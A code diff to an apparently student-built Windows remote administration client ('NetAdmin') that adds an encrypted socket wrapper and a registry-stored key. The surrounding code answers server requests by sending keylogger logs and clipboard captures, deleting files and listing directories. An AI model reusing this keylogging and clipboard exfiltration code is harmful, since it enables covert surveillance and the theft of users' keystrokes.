@@ -1,4 +1,5 @@
 import argparse
+import base64
 import configparser
 import logging
 import os
@@ -28,6 +29,8 @@ from os import path
 import mss.windows
 from subprocess import Popen, PIPE
 
+from SmartSocket import SmartSocket
+
 logger = logging.getLogger('logger')
 logger.setLevel(logging.DEBUG)
 
@@ -55,6 +58,13 @@ fh.setFormatter(formatter)
 logger.addHandler(fh)
 logger.info("Logger initialized")
 
+
+def stringToBase64(s):
+    return base64.b64encode(s.encode('utf-8'))
+
+def base64ToString(b):
+    return base64.b64decode(b).decode('utf-8')
+
 try:
     if not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')):
         sys.path.insert(1, os.path.join(sys.path[0], '../shared'))
@@ -74,6 +84,25 @@ try:
     logger.info(f"TURBOJPEG PATH: {tp}")
 
     jpeg = TurboJPEG(tp)
+
+    def set_encryption_key(id):
+        """
+        Creates or modifies an existing registry key specifying the encryption of the client.
+        Args:
+            id: the encryption key to be set or modified to.
+        """
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\NetAdmin\\Configuration")
+        winreg.SetValue(key, 'EKey', winreg.REG_SZ, id)
+
+    def get_encryption_key():
+        """
+        Gets the encryption key of the client. Raises an exception if the key does not exist.
+
+        Returns: the encryption key  found in the registry or None if not found.
+
+        """
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\NetAdmin\\Configuration")
+        return winreg.QueryValue(key, 'EKey')
 
     def set_id(id):
         """
@@ -402,12 +431,13 @@ try:
                 else:
                     sockaddr = (cAddress, int(cPort))
 
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s = SmartSocket(None, socket.AF_INET, socket.SOCK_STREAM)
                 s.connect(sockaddr)
 
                 logger.info("CONNECTED TO SERVER")
                 client_connection_main(s, computer)
             # if we except because of s.connect, retry connection
+            #TODO if we get an error due to other exceptions, do not try to reconnect
             except Exception as e:
                 print(str(e))
                 time.sleep(5)
@@ -423,11 +453,9 @@ try:
         # main loop
         # receives and unpacks messages from the server, and checks the type of message
         while process_status:
-            size, message = NetProtocol.unpackFromSocket(s)
+            size, message = s.recv_message()
             if message == -1:
                 return
-
-            message = orjson.loads(message)  # convert the message to dictionary from json
 
             id = message['id']  # get the echo id of the message, to echo back to the server when sending response
 
@@ -440,8 +468,7 @@ try:
                     # reset the id
                     set_id("")
                     # send a request to identify again
-                    s.send(NetProtocol.packNetMessage(
-                        NetMessage(type=NetTypes.NetIdentification, data=NetIdentification(get_id()), id=id)))
+                    s.send_message(NetMessage(type=NetTypes.NetIdentification, data=NetIdentification(get_id()), id=id))
 
             # if message is a request
             if message['type'] == NetTypes.NetRequest.value:
@@ -454,8 +481,7 @@ try:
                     try:
                         with open(KEYLOG_PATH, "r") as f:
                             logger.debug("OPENED KEYLOGGER")
-                            s.send(NetProtocol.packNetMessage(
-                                NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id)))
+                            s.send_message(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id))
                     except Exception as e:
                         logger.info(str(e))
 
@@ -464,8 +490,7 @@ try:
                     try:
                         with open(CLIPBOARD_PATH, "r") as f:
                             logger.debug("OPENED CLIPBOARD")
-                            s.send(NetProtocol.packNetMessage(
-                                NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id)))
+                            s.send_message(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id))
                     except Exception as e:
                         logger.info(str(e))
 
@@ -511,8 +536,7 @@ try:
                     start = datetime.datetime.now()
                     actualCall = ActualDirectorySize(directory, True)
                     print(f"Manual method for {directory}: {datetime.datetime.now() - start}")
-                    s.send(NetProtocol.packNetMessage(
-                        NetMessage(type=NetTypes.NetDirectorySize, data=NetDirectorySize(actualCall), id=id)))
+                    s.send_message(NetMessage(type=NetTypes.NetDirectorySize, data=NetDirectorySize(actualCall), id=id))
 
                 # if the request is to delete a file
                 elif message['data'] == NetTypes.NetDeleteFile.value:
@@ -528,20 +552,18 @@ try:
                     # file or directory doesn't exist
                     except FileNotFoundError:
                         print("File not found: " + path)
-                        s.send(NetProtocol.packNetMessage(
-                            NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetFileNotFound.value),
-                                       id=id)))
+                        s.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetFileNotFound.value),
+                                       id=id))
 
                     # no access to directory error
                     except WindowsError:
                         print("Error deleting file: " + path)
-                        s.send(NetProtocol.packNetMessage(NetMessage(type=NetTypes.NetStatus, data=NetStatus(
-                            NetStatusTypes.NetDirectoryAccessDenied.value), id=id)))
+                        s.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(
+                            NetStatusTypes.NetDirectoryAccessDenied.value), id=id))
 
                     # success
                     else:
-                        s.send(NetProtocol.packNetMessage(
-                            NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetOK.value), id=id)))
+                        s.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetOK.value), id=id))
 
                 elif message['data'] == NetTypes.NetIdentification.value:  # if request to identify
                     try:
@@ -551,8 +573,12 @@ try:
                             "")  # if there is no id, then send a blank id to tell the server that this is a new client
                     else:
                         sMessage = NetIdentification(uid)  # if there is an id, then send the id to the server
-                    s.send(
-                        NetProtocol.packNetMessage(NetMessage(type=NetTypes.NetIdentification, data=sMessage, id=id)))
+                    s.send_message(NetMessage(type=NetTypes.NetIdentification, data=sMessage, id=id))
+
+                elif message['data'] == NetTypes.NetEncryptionVerification.value:  # if request to verify encryption
+                    d = get_encryption_key().encode()
+                    s.set_key(d)  # set the encryption key
+                    s.send_message(NetMessage(type=NetTypes.NetEncryptionVerification, data=NetStatus(NetStatusTypes.NetOK.value), id=id))
 
                 # if request system information
                 elif message['data'] == NetTypes.NetSystemInformation.value:
@@ -563,7 +589,7 @@ try:
                         platform.machine(),
                         computer.Win32_VideoController()[0].Name
                     )
-                    s.send(NetProtocol.packNetMessage(NetMessage(NetTypes.NetSystemInformation, sMessage, id=id)))
+                    s.send_message(NetMessage(NetTypes.NetSystemInformation, sMessage, id=id))
 
                 # if request system metrics
                 elif message['data'] == NetTypes.NetSystemMetrics.value:
@@ -577,7 +603,7 @@ try:
                         GPU_LOAD=GPU_LOAD,
                         DISK_LOAD=psutil.disk_usage('/')[3]
                     )
-                    s.send(NetProtocol.packNetMessage(NetMessage(NetTypes.NetSystemMetrics, sMessage, id=id)))
+                    s.send_message(NetMessage(NetTypes.NetSystemMetrics, sMessage, id=id))
 
                 # if request to open a new connection
                 elif message['data'] == NetTypes.NetOpenConnection.value:
@@ -585,9 +611,9 @@ try:
                     server = createServer()
                     thread = threading.Thread(target=handleOpenConnection, args=(server,))
                     thread.start()
-                    s.send(NetProtocol.packNetMessage(
+                    s.send_message(
                         NetMessage(NetTypes.NetStatus, NetStatus(NetStatusTypes.NetOK.value),
-                                   extra=server.getsockname()[1], id=id)))
+                                   extra=server.getsockname()[1], id=id))
 
                 # # if request actual folder size
                 # elif message['data'] == NetTypes.NetDirectorySize.value:
@@ -609,7 +635,7 @@ try:
                             sMessage.items.append(
                                 NetDirectoryItem(drive[:2], drive, NetTypes.NetDirectoryFolderCollapsable.value, None,
                                                  None, None))
-                        s.send(NetProtocol.packNetMessage(NetMessage(NetTypes.NetDirectoryListing, sMessage, id=id)))
+                        s.send_message(NetMessage(NetTypes.NetDirectoryListing, sMessage, id=id))
 
                     # if requesting normal directory
                     else:
@@ -622,9 +648,9 @@ try:
                         except PermissionError as e:
                             print("Permission is denied for directory", directory)
                             # send a NetDirectoryAccessDenied error to the server
-                            s.send(NetProtocol.packNetMessage(
+                            s.send_message(
                                 NetMessage(NetTypes.NetStatus, NetStatus(NetStatusTypes.NetDirectoryAccessDenied.value),
-                                           id=id)))
+                                           id=id))
 
                         # if got directory listing (we have permission)
                         else:
@@ -671,12 +697,12 @@ try:
                                                      last_modified=os.path.getmtime(directory + file),
                                                      size=os.path.getsize(directory + file)))
                             print(f"WinScript Method for {directory}: ", datetime.datetime.now() - ctime)
-                            s.send(
-                                NetProtocol.packNetMessage(NetMessage(NetTypes.NetDirectoryListing, sMessage, id=id)))
+                            s.send(NetMessage(NetTypes.NetDirectoryListing, sMessage, id=id))
 
             # if server sent an id, then set the id to it
             elif message['type'] == NetTypes.NetIdentification.value:
                 set_id(message['data']['id'])
+                set_encryption_key(message['extra'])
 
 
     import ctypes, sys
